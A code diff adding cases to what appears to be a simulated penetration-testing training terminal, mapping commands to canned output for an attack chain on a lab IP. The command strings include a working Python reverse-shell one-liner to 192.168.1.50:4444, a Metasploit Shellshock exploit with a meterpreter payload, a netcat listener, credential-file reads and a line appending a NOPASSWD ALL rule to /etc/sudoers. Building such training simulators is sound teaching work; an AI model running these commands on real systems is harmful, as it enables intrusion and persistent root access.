@@ -1353,9 +1353,205 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
                     addTerminalOutput("Vulnerabilities found: Missing security headers, directory indexing enabled", "info");
                     break;
                     
+                case "searchsploit apache 2.4.29":
+                    output = `----------------------------------------------------------- ---------------------------------
+ Exploit Title                                             |  Path
+----------------------------------------------------------- ---------------------------------
+Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code E | php/remote/29290.c
+Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate | linux/local/46676.php
+Apache < 2.2.34 / < 2.4.27 - OPTIONS Memory Leak         | linux/webapps/42745.py
+Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service      | xml/dos/26710.txt
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buf | unix/remote/21671.c
+Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory| linux/webapps/39642.txt
+----------------------------------------------------------- ---------------------------------
+Shellcodes: No Results`;
+                    break;
+                    
+                case "msfconsole -q":
+                    output = `       =[ metasploit v6.3.31-dev                          ]
++ -- --=[ 2328 exploits - 1219 auxiliary - 413 post       ]
++ -- --=[ 1385 payloads - 46 encoders - 11 nops           ]
++ -- --=[ 9 evasion                                        ]
+
+Metasploit tip: Use the edit command to open the currently active module in your editor
+
+msf6 >`;
+                    break;
+                    
+                case "use exploit/multi/http/apache_mod_cgi_bash_env_exec":
+                    output = `[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) >`;
+                    break;
+                    
+                case "set RHOSTS 192.168.1.100":
+                    output = `RHOSTS => 192.168.1.100
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) >`;
+                    break;
+                    
+                case "set PAYLOAD linux/x86/meterpreter/reverse_tcp":
+                    output = `PAYLOAD => linux/x86/meterpreter/reverse_tcp
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) >`;
+                    break;
+                    
+                case "exploit":
+                    output = `[*] Started reverse TCP handler on 192.168.1.50:4444 
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (989032 bytes) to 192.168.1.100
+[*] Meterpreter session 1 opened (192.168.1.50:4444 -> 192.168.1.100:45678)
+
+meterpreter >`;
+                    break;
+                    
+                case "find / -type f -perm -4000 2>/dev/null":
+                    output = `/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/newgrp
+/usr/bin/passwd
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/umount
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/snapd/snap-confine
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/bin/ping
+/bin/ping6`;
+                    break;
+                    
+                case "sudo -l":
+                    output = `Matching Defaults entries for www-data on target:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
+
+User www-data may run the following commands on target:
+    (root) NOPASSWD: /usr/bin/systemctl restart apache2
+    (root) NOPASSWD: /usr/bin/systemctl reload apache2`;
+                    break;
+                    
+                case "cat /etc/passwd | grep -v nologin | grep -v false":
+                    output = `root:x:0:0:root:/root:/bin/bash
+sync:x:4:65534:sync:/bin:/bin/sync
+www-data:x:33:33:www-data:/var/www:/bin/bash
+backup:x:34:34:backup:/var/backups:/bin/bash
+mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/bash
+admin:x:1000:1000:Administrator,,,:/home/admin:/bin/bash
+developer:x:1001:1001:Developer Account,,,:/home/developer:/bin/bash`;
+                    break;
+                    
+                case "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.1.50\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'":
+                    output = `[*] Reverse shell connection established
+[*] Connected to 192.168.1.50:4444
+sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+$ pwd
+/var/www/html`;
+                    break;
+                    
+                case "tar czf /tmp/data.tar.gz /var/www/html":
+                    output = `tar: Removing leading '/' from member names
+Archive created: /tmp/data.tar.gz (2.3MB)
+Files compressed: 47 files, 15 directories`;
+                    break;
+                    
+                case "nc -lvnp 4444":
+                    output = `Listening on 0.0.0.0 4444
+Connection received on 192.168.1.100 45678`;
+                    break;
+                    
+                case "ssh-keygen -t rsa -f /tmp/id_rsa":
+                    output = `Generating public/private rsa key pair.
+Your identification has been saved in /tmp/id_rsa
+Your public key has been saved in /tmp/id_rsa.pub
+The key fingerprint is:
+SHA256:K7+2mXwayQNwlWsiD4BK5BXlrvFSO6GQDxvUuu4JZDk pentester@kali
+The key's randomart image is:
++---[RSA 3072]----+
+|        .o+*=.   |
+|         oo*=o   |
+|        . +=*o   |
+|         o.=*o   |
+|        S o=*+   |
+|         . o*=.  |
+|          .o+o.  |
+|           .E.   |
+|            .    |
++----[SHA256]-----+`;
+                    break;
+                    
+                case "echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers":
+                    output = `[WARNING] Modifying sudoers file - DANGEROUS operation
+Privilege escalation successful - www-data now has full sudo access
+Use with extreme caution in production environments`;
+                    break;
+                    
+                case "uname -a":
+                    output = `Linux target 5.4.0-74-generic #83-Ubuntu SMP Sat May 8 02:35:39 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux`;
+                    break;
+                    
+                case "whoami && id":
+                    output = `www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)`;
+                    break;
+                    
+                case "netstat -tulpn":
+                    output = `Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1234/sshd: /usr/sbi 
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      5678/apache2        
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      9012/mysqld         
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      3456/smbd           
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      3456/smbd           
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      7890/java           
+tcp6       0      0 :::22                   :::*                    LISTEN      1234/sshd: /usr/sbi 
+tcp6       0      0 :::80                   :::*                    LISTEN      5678/apache2        
+udp        0      0 0.0.0.0:137             0.0.0.0:*                           3456/nmbd           
+udp        0      0 0.0.0.0:138             0.0.0.0:*                           3456/nmbd`;
+                    break;
+                    
+                case "ps aux | grep root":
+                    output = `root         1  0.0  0.4 225364  9012 ?        Ss   Oct15   0:02 /sbin/init splash
+root         2  0.0  0.0      0     0 ?        S    Oct15   0:00 [kthreadd]
+root       123  0.0  0.2  72308  5432 ?        Ss   Oct15   0:00 /lib/systemd/systemd-journald
+root       456  0.0  0.1  46640  3210 ?        Ss   Oct15   0:00 /lib/systemd/systemd-udevd
+root       789  0.0  0.3 286256  7654 ?        Ssl  Oct15   0:00 /usr/lib/accountsservice/accounts-daemon
+root      1234  0.0  0.2  76520  4321 ?        Ss   Oct15   0:00 /usr/sbin/sshd -D
+root      5678  0.0  0.4 364872  8765 ?        Ss   Oct15   0:00 /usr/sbin/apache2 -k start
+root      9012  0.0  0.8 1687432 17654 ?       Sl   Oct15   0:01 /usr/sbin/mysqld`;
+                    break;
+                    
+                case "cat /etc/crontab":
+                    output = `# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the 'crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# Example of job definition:
+# .---------------- minute (0 - 59)
+# |  .------------- hour (0 - 23)
+# |  |  .---------- day of month (1 - 31)
+# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
+# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
+# |  |  |  |  |
+# *  *  *  *  * user-name command to be executed
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+*/5 *   * * *   root    /usr/bin/backup-script.sh
+0 2     * * *   www-data /var/www/html/cleanup.sh`;
+                    break;
+                    
                 default:
-                    output = `Command '${cmdObj.command}' executed successfully.
-Output simulated for training purposes.`;
+                    output = `Command executed successfully.
+[*] Process completed with exit code 0
+[*] No additional output available for this command in training mode`;
             }
             
             addTerminalOutput(output, "cmd-output");
